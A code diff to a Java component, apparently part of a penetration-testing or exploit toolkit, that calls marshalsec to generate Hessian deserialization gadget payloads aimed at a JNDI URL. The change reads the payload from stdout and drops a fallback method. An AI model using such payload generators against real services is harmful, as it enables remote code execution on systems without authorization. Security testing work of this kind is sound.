@@ -4,7 +4,6 @@ import org.springframework.beans.factory.annotation.Value;
 import org.springframework.stereotype.Component;
 
 import java.io.*;
-import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -109,68 +108,39 @@ public class HessianChainHandler implements ChainHandler {
             return new byte[0];
         }
 
-        File outFile;
-        try {
-            outFile = File.createTempFile("hessian_payload_", ".bin");
-            outFile.deleteOnExit();
-        } catch (IOException e) {
-            return new byte[0];
-        }
-
         // marshalsec only has marshalsec.Hessian (Hessian2 format).
         // Hessian1 format must be generated via java-chains (jchains_hessian1_* chains).
+        // Usage: <gadget> <jndi_url>  — outputs serialized payload to stdout.
         String mainClass = "marshalsec.Hessian";
 
         List<String> cmd = new ArrayList<>();
         cmd.add(javaExe);
         cmd.addAll(List.of("-cp", marshalJar.getAbsolutePath(), mainClass,
-                           gadget, outFile.getAbsolutePath(), jndiUrl));
+                           gadget, jndiUrl));
 
         Logger log = Logger.getLogger(HessianChainHandler.class.getName());
         log.info("marshalsec: " + String.join(" ", cmd));
 
         try {
             ProcessBuilder pb = new ProcessBuilder(cmd);
-            pb.redirectErrorStream(true);
+            // Keep stderr separate so stdout contains only the binary payload
             Process proc = pb.start();
-            String output = new String(proc.getInputStream().readAllBytes());
+            byte[] stdoutBytes = proc.getInputStream().readAllBytes();
+            String stderr = new String(proc.getErrorStream().readAllBytes());
             int exitCode = proc.waitFor();
 
             if (exitCode != 0) {
-                log.warning("marshalsec exit=" + exitCode + " output=" + output);
-                // Try fallback: some versions use different class names
-                return tryFallback(gadget, jndiUrl, hessian2, javaExe, marshalJar, outFile);
+                log.warning("marshalsec exit=" + exitCode + " stderr=" + stderr);
+                return new byte[0];
             }
-
-            byte[] bytes = Files.readAllBytes(outFile.toPath());
-            outFile.delete();
-            return bytes;
+            if (stdoutBytes.length > 0) {
+                log.info("marshalsec: stdout " + stdoutBytes.length + " bytes");
+                return stdoutBytes;
+            }
+            log.warning("marshalsec: empty stdout. stderr=" + stderr);
+            return new byte[0];
         } catch (Exception e) {
             log.warning("marshalsec error: " + e);
-            return new byte[0];
-        }
-    }
-
-    /**
-     * Fallback: try marshalsec.HessianBase or unified marshalsec.Hessian with extra args.
-     */
-    private static byte[] tryFallback(String gadget, String jndiUrl,
-                                      boolean hessian2, String javaExe,
-                                      File marshalJar, File outFile) {
-        // Some marshalsec versions use a single Hessian class for both protocols
-        List<String> fallbackCmd = new ArrayList<>();
-        fallbackCmd.add(javaExe);
-        fallbackCmd.addAll(List.of("-cp", marshalJar.getAbsolutePath(),
-                                   "marshalsec.Hessian",
-                                   gadget, outFile.getAbsolutePath(), jndiUrl));
-        try {
-            Process proc = new ProcessBuilder(fallbackCmd).redirectErrorStream(true).start();
-            proc.getInputStream().readAllBytes();
-            proc.waitFor();
-            byte[] bytes = Files.readAllBytes(outFile.toPath());
-            outFile.delete();
-            return bytes;
-        } catch (Exception e) {
             return new byte[0];
         }
     }
